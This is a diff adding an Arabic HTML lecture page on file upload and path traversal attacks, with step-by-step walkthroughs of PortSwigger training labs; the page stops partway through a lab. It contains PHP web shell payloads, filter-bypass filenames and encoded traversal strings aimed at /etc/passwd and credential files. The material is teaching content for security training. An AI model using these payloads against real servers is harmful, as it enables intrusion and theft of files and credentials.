@@ -1,0 +1,1195 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>محاضرة File Upload + Path Traversal - أمان تطبيقات الويب</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-okaidia.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            line-height: 1.6;
+            color: #e8eaed;
+            background: #121212;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 48px;
+            padding: 64px 24px;
+            background: linear-gradient(135deg, #0175C2, #13B9FD);
+            border-radius: 12px;
+            box-shadow: 0 4px 24px rgba(1, 117, 194, 0.15);
+        }
+
+        .header h1 {
+            font-size: 2.75rem;
+            font-weight: 400;
+            color: #ffffff;
+            margin-bottom: 16px;
+            letter-spacing: -0.5px;
+        }
+
+        .header .subtitle {
+            font-size: 1.25rem;
+            font-weight: 300;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 24px;
+        }
+
+        .lecture-info {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+            margin-top: 20px;
+        }
+
+        .info-item {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 12px 24px;
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: #ffffff;
+            font-weight: 500;
+        }
+
+        .info-item i {
+            color: #ffffff;
+            margin-left: 8px;
+        }
+
+        .nav-menu {
+            background: #1e1e1e;
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 32px;
+            border: 1px solid #3c4043;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        .nav-menu h3 {
+            color: #e8eaed;
+            font-size: 1.5rem;
+            font-weight: 500;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .nav-menu ul {
+            list-style: none;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 10px;
+        }
+
+        .nav-menu li {
+            background: #2d2d2d;
+            border-radius: 8px;
+            transition: all 0.2s ease;
+            margin-bottom: 4px;
+        }
+
+        .nav-menu li:hover {
+            background: rgba(66, 165, 245, 0.15);
+            transform: translateX(-2px);
+        }
+
+        .nav-menu a {
+            color: #9aa0a6;
+            text-decoration: none;
+            padding: 12px 16px;
+            display: block;
+            border-radius: 8px;
+            font-weight: 500;
+        }
+
+        .nav-menu a:hover {
+            color: #42a5f5;
+        }
+
+        .section {
+            background: #1e1e1e;
+            margin-bottom: 32px;
+            border-radius: 12px;
+            padding: 32px;
+            border: 1px solid #3c4043;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        .section-title {
+            color: #e8eaed;
+            font-size: 2.125rem;
+            font-weight: 500;
+            margin-bottom: 24px;
+            text-align: center;
+            border-bottom: 2px solid #42a5f5;
+            padding-bottom: 16px;
+        }
+
+        .subsection-title {
+            color: #42a5f5;
+            font-size: 1.375rem;
+            font-weight: 500;
+            margin: 32px 0 16px 0;
+            padding: 16px 20px;
+            background: rgba(66, 165, 245, 0.1);
+            border-right: 4px solid #42a5f5;
+            border-radius: 8px;
+        }
+
+        .highlight-box {
+            background: #2d2d2d;
+            border: 1px solid #3c4043;
+            border-radius: 12px;
+            padding: 24px;
+            margin: 24px 0;
+            color: #e8eaed;
+        }
+
+        .highlight-box h4 {
+            color: #42a5f5;
+            margin-bottom: 12px;
+            font-size: 1.125rem;
+            font-weight: 500;
+        }
+
+        .lab-card {
+            background: #1e1e1e;
+            border: 1px solid #3c4043;
+            border-radius: 12px;
+            padding: 24px;
+            margin: 24px 0;
+            color: #e8eaed;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            transition: all 0.2s ease;
+        }
+
+        .lab-card:hover {
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+            transform: translateY(-2px);
+            border-color: #42a5f5;
+        }
+
+        .lab-title {
+            color: #81c784;
+            font-size: 1.25rem;
+            font-weight: 500;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .lab-url {
+            background: #2d2d2d;
+            border: 1px solid #3c4043;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 16px;
+            word-break: break-all;
+            transition: all 0.2s ease;
+        }
+
+        .lab-url:hover {
+            background: rgba(66, 165, 245, 0.1);
+            border-color: #42a5f5;
+        }
+
+        .lab-url a {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s ease;
+            color: #42a5f5;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .lab-url a:hover {
+            color: #90caf9 !important;
+        }
+
+        .step-list {
+            list-style: none;
+            counter-reset: step-counter;
+        }
+
+        .step-list li {
+            counter-increment: step-counter;
+            margin: 12px 0;
+            padding: 12px 16px;
+            background: #2d2d2d;
+            border-right: 3px solid #81c784;
+            border-radius: 8px;
+            position: relative;
+            color: #e8eaed;
+        }
+
+        .step-list li::before {
+            content: counter(step-counter);
+            position: absolute;
+            right: -15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #81c784;
+            color: #121212;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 500;
+            font-size: 0.875rem;
+        }
+
+        .payload-box {
+            background: #1a1a1a;
+            border: 1px solid #3c4043;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 16px 0;
+            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+            color: #42a5f5;
+            overflow-x: auto;
+            font-size: 0.875rem;
+        }
+
+        .payload-box code {
+            color: #81c784;
+        }
+
+        .warning-box {
+            background: #2d1b1b;
+            border: 1px solid #ff9800;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            color: #e8eaed;
+        }
+
+        .warning-box h4 {
+            color: #ff5722;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 500;
+        }
+
+        .tips-box {
+            background: #1a2332;
+            border: 1px solid #42a5f5;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            color: #e8eaed;
+        }
+
+        .tips-box h4 {
+            color: #42a5f5;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 500;
+        }
+
+        .code-example {
+            background: #1a1a1a;
+            border: 1px solid #3c4043;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 15px 0;
+            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+            font-size: 0.875rem;
+            overflow-x: auto;
+            color: #e8eaed;
+        }
+
+        .secure-code {
+            border-color: #4caf50;
+        }
+
+        .vulnerable-code {
+            border-color: #f44336;
+        }
+
+        .attack-flow {
+            background: rgba(66, 165, 245, 0.1);
+            border: 2px dashed #42a5f5;
+            border-radius: 12px;
+            padding: 24px;
+            margin: 24px 0;
+            text-align: center;
+        }
+
+        .attack-step {
+            display: inline-block;
+            background: #42a5f5;
+            color: #121212;
+            padding: 12px 16px;
+            margin: 6px;
+            border-radius: 24px;
+            font-weight: 500;
+            font-size: 0.875rem;
+        }
+
+        .arrow {
+            color: #42a5f5;
+            font-size: 1.25rem;
+            margin: 0 8px;
+        }
+
+        .conclusion {
+            background: linear-gradient(135deg, #0175C2, #13B9FD);
+            border-radius: 12px;
+            padding: 48px 32px;
+            margin-top: 48px;
+            text-align: center;
+            color: #ffffff;
+        }
+
+        .conclusion h2 {
+            color: #ffffff;
+            font-weight: 400;
+            font-size: 2rem;
+            margin-bottom: 24px;
+        }
+
+        .back-home {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            padding: 16px 32px;
+            border-radius: 24px;
+            text-decoration: none;
+            margin-top: 24px;
+            transition: all 0.2s ease;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            font-weight: 500;
+        }
+
+        .back-home:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+
+            .header h1 {
+                font-size: 2em;
+            }
+
+            .section {
+                padding: 20px;
+            }
+
+            .lecture-info {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .nav-menu ul {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-upload"></i> محاضرة File Upload + Path Traversal</h1>
+            <div class="subtitle">الجزء الثالث من سلسلة الهجمات من جانب الخادم</div>
+            <div class="lecture-info">
+                <div class="info-item">
+                    <i class="fas fa-clock"></i>
+                    المدة: ساعتان
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-flask"></i>
+                    المختبرات: 13 مختبر
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-shield-alt"></i>
+                    المستوى: متوسط إلى متقدم
+                </div>
+            </div>
+        </div>
+
+        <div class="nav-menu">
+            <h3><i class="fas fa-list"></i> فهرس المحاضرة</h3>
+            <ul>
+                <li><a href="#introduction"><i class="fas fa-play"></i> مقدمة</a></li>
+                <li><a href="#file-upload-basics"><i class="fas fa-upload"></i> أساسيات رفع الملفات</a></li>
+                <li><a href="#file-upload-types"><i class="fas fa-bug"></i> أنواع ثغرات رفع الملفات</a></li>
+                <li><a href="#file-upload-labs"><i class="fas fa-flask"></i> 7 مختبرات رفع الملفات</a></li>
+                <li><a href="#path-traversal-basics"><i class="fas fa-folder-open"></i> أساسيات Path Traversal</a></li>
+                <li><a href="#path-traversal-types"><i class="fas fa-route"></i> أنواع Path Traversal</a></li>
+                <li><a href="#path-traversal-labs"><i class="fas fa-vials"></i> 6 مختبرات Path Traversal</a></li>
+                <li><a href="#prevention"><i class="fas fa-shield-virus"></i> طرق الحماية</a></li>
+                <li><a href="#conclusion"><i class="fas fa-trophy"></i> الخلاصة</a></li>
+            </ul>
+        </div>
+
+        <!-- مقدمة -->
+        <div id="introduction" class="section">
+            <h2 class="section-title"><i class="fas fa-play"></i> مقدمة</h2>
+            
+            <div class="highlight-box">
+                <h4><i class="fas fa-info-circle"></i> أهداف المحاضرة</h4>
+                <ul>
+                    <li>فهم آليات عمل ثغرات رفع الملفات وأنواعها المختلفة</li>
+                    <li>إتقان تقنيات Path Traversal للوصول للملفات الحساسة</li>
+                    <li>تطبيق تقنيات تجاوز الفلاتر والحماية</li>
+                    <li>تنفيذ Web Shells للسيطرة على الخوادم</li>
+                    <li>تطبيق طرق الحماية الفعالة ضد هذه الهجمات</li>
+                </ul>
+            </div>
+
+            <p>ثغرات <strong>File Upload</strong> و <strong>Path Traversal</strong> من أخطر الثغرات في تطبيقات الويب. تسمح ثغرات رفع الملفات للمهاجمين بتحميل ملفات خبيثة قد تؤدي إلى تنفيذ أوامر على الخادم، بينما تمكن ثغرات Path Traversal من الوصول للملفات الحساسة خارج المجلد المحدد.</p>
+
+            <div class="attack-flow">
+                <div class="attack-step">رفع ملف خبيث</div>
+                <span class="arrow">→</span>
+                <div class="attack-step">تجاوز الفلاتر</div>
+                <span class="arrow">→</span>
+                <div class="attack-step">تنفيذ Web Shell</div>
+                <span class="arrow">→</span>
+                <div class="attack-step">السيطرة على الخادم</div>
+            </div>
+        </div>
+
+        <!-- أساسيات رفع الملفات -->
+        <div id="file-upload-basics" class="section">
+            <h2 class="section-title"><i class="fas fa-upload"></i> أساسيات ثغرات رفع الملفات</h2>
+
+            <div class="highlight-box">
+                <h4><i class="fas fa-question-circle"></i> ما هي ثغرات File Upload؟</h4>
+                <p>ثغرات تحدث عندما تسمح تطبيقات الويب برفع ملفات دون فحص مناسب لنوعها أو محتواها أو اسمها، مما يتيح للمهاجمين رفع ملفات خبيثة قد تؤدي إلى تنفيذ أوامر على الخادم.</p>
+            </div>
+
+            <h3 class="subsection-title"><i class="fas fa-cogs"></i> آلية عمل ثغرات رفع الملفات</h3>
+            
+            <div class="payload-box">
+                <strong>مثال على طلب رفع ملف:</strong><br>
+                <code>POST /upload HTTP/1.1<br>
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary<br><br>
+                ------WebKitFormBoundary<br>
+                Content-Disposition: form-data; name="file"; filename="shell.php"<br>
+                Content-Type: application/x-php<br><br>
+                &lt;?php echo system($_GET['cmd']); ?&gt;<br>
+                ------WebKitFormBoundary--</code>
+            </div>
+
+            <h3 class="subsection-title"><i class="fas fa-exclamation-triangle"></i> مخاطر ثغرات رفع الملفات</h3>
+            
+            <div class="warning-box">
+                <h4><i class="fas fa-skull-crossbones"></i> التأثيرات الخطيرة</h4>
+                <ul>
+                    <li><strong>Remote Code Execution (RCE):</strong> تنفيذ أوامر على الخادم</li>
+                    <li><strong>Web Shell:</strong> السيطرة الكاملة على الخادم</li>
+                    <li><strong>Defacement:</strong> تشويه الموقع</li>
+                    <li><strong>Data Exfiltration:</strong> سرقة البيانات الحساسة</li>
+                    <li><strong>Malware Distribution:</strong> توزيع البرمجيات الخبيثة</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- أنواع ثغرات رفع الملفات -->
+        <div id="file-upload-types" class="section">
+            <h2 class="section-title"><i class="fas fa-bug"></i> أنواع ثغرات رفع الملفات</h2>
+
+            <h3 class="subsection-title"><i class="fas fa-unlock"></i> 1. Unrestricted File Upload</h3>
+            <div class="highlight-box">
+                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
+                <p>عدم وجود أي قيود على نوع الملفات المرفوعة.</p>
+                <div class="payload-box">
+                    <strong>Web Shell بسيط:</strong><br>
+                    <code>&lt;?php echo file_get_contents('/etc/passwd'); ?&gt;</code>
+                </div>
+            </div>
+
+            <h3 class="subsection-title"><i class="fas fa-file-code"></i> 2. Content-Type Bypass</h3>
+            <div class="highlight-box">
+                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
+                <p>تجاوز فحص Content-Type عبر تعديل الـ Header.</p>
+                <div class="payload-box">
+                    <strong>Payload:</strong><br>
+                    <code>Content-Type: image/jpeg  // بدلاً من application/x-php</code>
+                </div>
+            </div>
+
+            <h3 class="subsection-title"><i class="fas fa-ban"></i> 3. Extension Blacklist Bypass</h3>
+            <div class="highlight-box">
+                <h4><i class="fas fa-info-circle"></i> التقنيات المستخدمة</h4>
+                <ul>
+                    <li><strong>Alternative Extensions:</strong> .php5, .phtml, .phar</li>
+                    <li><strong>Case Manipulation:</strong> .PHP, .Php</li>
+                    <li><strong>Null Byte Injection:</strong> shell.php%00.jpg</li>
+                    <li><strong>Double Extensions:</strong> shell.php.jpg</li>
+                    <li><strong>Trailing Characters:</strong> shell.php.</li>
+                </ul>
+            </div>
+
+            <h3 class="subsection-title"><i class="fas fa-folder"></i> 4. Path Traversal in Upload</h3>
+            <div class="highlight-box">
+                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
+                <p>استخدام Path Traversal لرفع الملفات في مجلدات قابلة للتنفيذ.</p>
+                <div class="payload-box">
+                    <strong>Payload:</strong><br>
+                    <code>filename="../../../var/www/html/shell.php"</code>
+                </div>
+            </div>
+
+            <h3 class="subsection-title"><i class="fas fa-image"></i> 5. Magic Bytes / File Header Bypass</h3>
+            <div class="highlight-box">
+                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
+                <p>إضافة Magic Bytes للملفات لتبدو كصور حقيقية.</p>
+                <div class="payload-box">
+                    <strong>JPEG Magic Bytes + PHP:</strong><br>
+                    <code>FF D8 FF E0 00 10 4A 46 49 46<br>
+                    &lt;?php echo system($_GET['cmd']); ?&gt;</code>
+                </div>
+            </div>
+        </div>
+
+        <!-- مختبرات رفع الملفات -->
+        <div id="file-upload-labs" class="section">
+            <h2 class="section-title"><i class="fas fa-flask"></i> مختبرات رفع الملفات - 7 مختبرات</h2>
+
+            <!-- Lab 1 -->
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 1: Remote code execution via web shell upload
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> رفع Web Shell بسيط واستخراج ملف سري.</p>
+                
+                <ol class="step-list">
+                    <li>سجل دخول بالبيانات: wiener:peter</li>
+                    <li>ارفع صورة كـ avatar ولاحظ المسار في Burp</li>
+                    <li>أنشئ ملف exploit.php بالمحتوى: <code>&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code></li>
+                    <li>ارفع الملف بدلاً من الصورة</li>
+                    <li>اطلب الملف المرفوع: <code>GET /files/avatars/exploit.php</code></li>
+                    <li>احصل على المحتوى السري وأرسله</li>
+                </ol>
+            </div>
+
+            <!-- Lab 2 -->
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 2: Web shell upload via Content-Type restriction bypass
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> تجاوز فحص Content-Type لرفع PHP shell.</p>
+                
+                <ol class="step-list">
+                    <li>أنشئ exploit.php واحاول رفعه</li>
+                    <li>لاحظ رسالة الخطأ حول MIME type</li>
+                    <li>في Burp Repeater، غير Content-Type إلى image/jpeg</li>
+                    <li>أرسل الطلب ولاحظ نجاح الرفع</li>
+                    <li>اطلب الملف للحصول على النتيجة</li>
+                </ol>
+            </div>
+
+            <!-- Lab 3 -->
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 3: Web shell upload via path traversal
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استخدام Path Traversal لرفع الملف في مجلد قابل للتنفيذ.</p>
+                
+                <ol class="step-list">
+                    <li>ارفع exploit.php ولاحظ أنه لا يتم تنفيذه</li>
+                    <li>في Repeater، غير filename إلى: <code>../exploit.php</code></li>
+                    <li>لاحظ أن الخادم يزيل ../ من الاسم</li>
+                    <li>استخدم URL encoding: <code>..%2fexploit.php</code></li>
+                    <li>اطلب الملف من /files/exploit.php</li>
+                    <li>احصل على المحتوى السري</li>
+                </ol>
+            </div>
+
+            <!-- Lab 4 -->
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 4: Web shell upload via extension blacklist bypass
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> تجاوز القائمة السوداء للامتدادات باستخدام .htaccess.</p>
+                
+                <ol class="step-list">
+                    <li>احاول رفع exploit.php ولاحظ منع الامتداد</li>
+                    <li>أنشئ ملف .htaccess بالمحتوى: <code>AddType application/x-httpd-php .l33t</code></li>
+                    <li>ارفع .htaccess أولاً</li>
+                    <li>غير اسم exploit.php إلى exploit.l33t</li>
+                    <li>ارفع exploit.l33t</li>
+                    <li>اطلب الملف وسيتم تنفيذه كـ PHP</li>
+                </ol>
+            </div>
+
+            <!-- Lab 5 -->
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 5: Web shell upload via obfuscated file extension
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استخدام Null Byte لتجاوز فحص الامتداد.</p>
+                
+                <ol class="step-list">
+                    <li>احاول رفع exploit.php ولاحظ رفض JPG/PNG فقط</li>
+                    <li>في Repeater، غير filename إلى: <code>exploit.php%00.jpg</code></li>
+                    <li>أرسل الطلب ولاحظ نجاح الرفع كـ exploit.php</li>
+                    <li>اطلب exploit.php للحصول على النتيجة</li>
+                </ol>
+            </div>
+
+            <!-- Lab 6 -->
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 6: Web shell upload via race condition
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استغلال Race Condition لتنفيذ الملف قبل حذفه.</p>
+                
+                <ol class="step-list">
+                    <li>أنشئ polyglot PHP/JPG file</li>
+                    <li>ارفع الملف ولاحظ أنه يتم حذفه بسرعة</li>
+                    <li>استخدم Burp Intruder لإرسال طلبات متزامنة</li>
+                    <li>طلب رفع + طلب تنفيذ في نفس الوقت</li>
+                    <li>نجح في الحصول على النتيجة قبل الحذف</li>
+                </ol>
+            </div>
+
+            <!-- Lab 7 -->
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 7: Web shell upload via PUT method
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-put-method" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-PUT-method
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استخدام HTTP PUT لرفع Web Shell.</p>
+                
+                <ol class="step-list">
+                    <li>اكتشف أن الخادم يدعم PUT method</li>
+                    <li>استخدم OPTIONS لتأكيد دعم PUT</li>
+                    <li>أرسل PUT request مع PHP shell</li>
+                    <li>PUT /shell.php مع المحتوى الخبيث</li>
+                    <li>اطلب الملف المرفوع للتنفيذ</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- أساسيات Path Traversal -->
+        <div id="path-traversal-basics" class="section">
+            <h2 class="section-title"><i class="fas fa-folder-open"></i> أساسيات Path Traversal</h2>
+
+            <div class="highlight-box">
+                <h4><i class="fas fa-question-circle"></i> ما هو Path Traversal؟</h4>
+                <p>Path Traversal (Directory Traversal) هي ثغرة تسمح للمهاجمين بالوصول للملفات والمجلدات خارج الدليل المخصص للتطبيق، مما يتيح قراءة الملفات الحساسة على الخادم.</p>
+            </div>
+
+            <h3 class="subsection-title"><i class="fas fa-cogs"></i> آلية عمل Path Traversal</h3>
+            
+            <div class="payload-box">
+                <strong>طلب عادي:</strong><br>
+                <code>GET /images?filename=product.jpg HTTP/1.1</code><br><br>
+                <strong>طلب خبيث:</strong><br>
+                <code>GET /images?filename=../../../etc/passwd HTTP/1.1</code>
+            </div>
+
+            <div class="attack-flow">
+                <div class="attack-step">طلب ملف عادي</div>
+                <span class="arrow">→</span>
+                <div class="attack-step">إضافة ../</div>
+                <span class="arrow">→</span>
+                <div class="attack-step">الخروج من المجلد</div>
+                <span class="arrow">→</span>
+                <div class="attack-step">الوصول للملفات الحساسة</div>
+            </div>
+
+            <h3 class="subsection-title"><i class="fas fa-file-alt"></i> الملفات الحساسة المستهدفة</h3>
+            
+            <div class="tips-box">
+                <h4><i class="fas fa-bullseye"></i> ملفات Linux الحساسة</h4>
+                <ul>
+                    <li><code>/etc/passwd</code> - معلومات المستخدمين</li>
+                    <li><code>/etc/shadow</code> - كلمات المرور المشفرة</li>
+                    <li><code>/etc/hosts</code> - ملف الـ hosts</li>
+                    <li><code>/var/log/apache2/access.log</code> - ملفات الـ logs</li>
+                    <li><code>/home/user/.ssh/id_rsa</code> - مفاتيح SSH</li>
+                </ul>
+            </div>
+
+            <div class="tips-box">
+                <h4><i class="fas fa-bullseye"></i> ملفات Windows الحساسة</h4>
+                <ul>
+                    <li><code>C:\Windows\System32\drivers\etc\hosts</code></li>
+                    <li><code>C:\Windows\boot.ini</code></li>
+                    <li><code>C:\inetpub\wwwroot\web.config</code></li>
+                    <li><code>C:\Windows\win.ini</code></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- أنواع Path Traversal -->
+        <div id="path-traversal-types" class="section">
+            <h2 class="section-title"><i class="fas fa-route"></i> أنواع هجمات Path Traversal</h2>
+
+            <h3 class="subsection-title"><i class="fas fa-arrow-up"></i> 1. Simple Path Traversal</h3>
+            <div class="highlight-box">
+                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
+                <p>استخدام .. للانتقال للمجلد الأعلى.</p>
+                <div class="payload-box">
+                    <strong>Payload:</strong><br>
+                    <code>../../../etc/passwd</code>
+                </div>
+            </div>
+
+            <h3 class="subsection-title"><i class="fas fa-shield-alt"></i> 2. Absolute Path Bypass</h3>
+            <div class="highlight-box">
+                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
+                <p>استخدام المسار المطلق عند حظر sequences التنقل.</p>
+                <div class="payload-box">
+                    <strong>Payload:</strong><br>
+                    <code>/etc/passwd</code>
+                </div>
+            </div>
+
+            <h3 class="subsection-title"><i class="fas fa-code"></i> 3. URL Encoding Bypass</h3>
+            <div class="highlight-box">
+                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
+                <p>تشفير الرموز لتجاوز الفلاتر.</p>
+                <div class="payload-box">
+                    <strong>Payloads:</strong><br>
+                    <code>%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code><br>
+                    <code>..%252f..%252f..%252fetc/passwd</code> (Double encoding)
+                </div>
+            </div>
+
+            <h3 class="subsection-title"><i class="fas fa-cut"></i> 4. Non-Recursive Filter Bypass</h3>
+            <div class="highlight-box">
+                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
+                <p>تجاوز الفلاتر التي تحذف ../ مرة واحدة فقط.</p>
+                <div class="payload-box">
+                    <strong>Payload:</strong><br>
+                    <code>....//....//....//etc/passwd</code>
+                </div>
+            </div>
+
+            <h3 class="subsection-title"><i class="fas fa-check-circle"></i> 5. Start Path Validation Bypass</h3>
+            <div class="highlight-box">
+                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
+                <p>تجاوز فحص بداية المسار المطلوبة.</p>
+                <div class="payload-box">
+                    <strong>Payload:</strong><br>
+                    <code>/var/www/images/../../../etc/passwd</code>
+                </div>
+            </div>
+
+            <h3 class="subsection-title"><i class="fas fa-file-image"></i> 6. File Extension Validation Bypass</h3>
+            <div class="highlight-box">
+                <h4><i class="fas fa-info-circle"></i> الوصف</h4>
+                <p>تجاوز فحص امتداد الملف باستخدام Null Byte.</p>
+                <div class="payload-box">
+                    <strong>Payload:</strong><br>
+                    <code>../../../etc/passwd%00.png</code>
+                </div>
+            </div>
+        </div>
+
+        <!-- مختبرات Path Traversal -->
+        <div id="path-traversal-labs" class="section">
+            <h2 class="section-title"><i class="fas fa-vials"></i> مختبرات Path Traversal - 6 مختبرات</h2>
+
+            <!-- Lab 1 -->
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 1: File path traversal, simple case
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/file-path-traversal/lab-simple" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/file-path-traversal/lab-simple
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استخراج محتوى ملف /etc/passwd باستخدام Path Traversal بسيط.</p>
+                
+                <ol class="step-list">
+                    <li>استخدم Burp لاعتراض طلب جلب صورة منتج</li>
+                    <li>غير معامل filename إلى: <code>../../../etc/passwd</code></li>
+                    <li>أرسل الطلب ولاحظ محتوى ملف passwd في الاستجابة</li>
+                </ol>
+            </div>
+
+            <!-- Lab 2 -->
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 2: File path traversal, traversal sequences blocked with absolute path bypass
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> تجاوز حظر traversal sequences باستخدام المسار المطلق.</p>
+                
+                <ol class="step-list">
